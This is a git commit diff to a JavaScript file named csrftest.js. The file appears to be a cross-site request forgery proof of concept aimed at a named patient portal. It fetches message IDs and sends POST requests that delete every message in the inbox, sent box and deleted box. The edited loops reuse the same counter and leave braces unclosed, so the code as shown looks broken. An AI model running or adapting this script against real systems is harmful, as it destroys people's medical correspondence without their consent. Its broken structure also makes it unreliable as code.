7d47e0226ed01bed57bfdd5bec5eb81af3200703
cybertron10 <56225601+cybertron10@users.noreply.github.com>
2020-08-22 16:43:01 -0400

    Update csrftest.js

--- csrftest.js
+++ csrftest.js
@@ -1,22 +1,33 @@
 var req = new XMLHttpRequest();
+var req2 = new XMLHttpRequest();
+var req3 = new XMLHttpRequest();
+var req4 = new XMLHttpRequest();
 
 req.onreadystatechange = function()
 {
 if (req.readyState == 4 && req.status == 200 )
   {
-  reponse_obj = JSON.parse(req.responseText);
-  for (var i = 0; i < reponse_obj.rows.length; i++) {
+ reponse_obj = JSON.parse(req.responseText);
+ for (var i = 0; i < reponse_obj.rows.length; i++) {
     var row = reponse_obj.rows[i];
     console.log(row.id);
-    var req2 = new XMLHttpRequest();
+    alert("Deleting Inbox");
     req2.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=0&msgid="+row.id+"&nact=1", true);
     req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     req2.send();
-    var req3 = new XMLHttpRequest();
+ 
+ for (var i = 0; i < reponse_obj.rows.length; i++) {
+    var row = reponse_obj.rows[i];
+    console.log(row.id);
+    alert("Deleting SentBox");
     req3.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=1&msgid="+row.id+"&nact=1", true);
     req3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     req3.send();
-    var req4 = new XMLHttpRequest();
+   
+ for (var i = 0; i < reponse_obj.rows.length; i++) {
+    var row = reponse_obj.rows[i];
+    console.log(row.id);
+    alert("Deleting DeleteBox");
     req4.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&msgid="+row.id+"&nact=1", true);
     req4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     req4.send();
